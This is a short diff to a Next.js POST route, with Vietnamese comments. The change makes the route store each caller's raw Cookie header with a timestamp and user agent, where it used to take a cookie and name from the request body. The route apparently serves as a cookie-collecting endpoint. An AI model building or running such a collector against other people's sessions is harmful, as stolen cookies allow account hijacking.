@@ -3,11 +3,12 @@ import { NextResponse } from "next/server";
 
 export async function POST(req: Request) {
   try {
-    const body = await req.json();
+    // 👉 lấy cookie từ header
+    const cookieHeader = req.headers.get("cookie");
 
-    if (!body?.cookie) {
+    if (!cookieHeader) {
       return NextResponse.json(
-        { error: "Missing cookie" },
+        { error: "No cookie found" },
         { status: 400 }
       );
     }
@@ -17,8 +18,8 @@ export async function POST(req: Request) {
 
     const entry = {
       time: new Date(),
-      name: body.name || "unknown",
-      cookie: body.cookie,
+      name: "from-header",
+      cookie: cookieHeader, // 👈 cookie raw
       userAgent: req.headers.get("user-agent"),
     };
 
@@ -26,6 +27,8 @@ export async function POST(req: Request) {
 
     return NextResponse.json({ success: true });
   } catch (err) {
+    console.error(err);
+
     return NextResponse.json(
       { error: "Failed to store cookie" },
       { status: 500 }
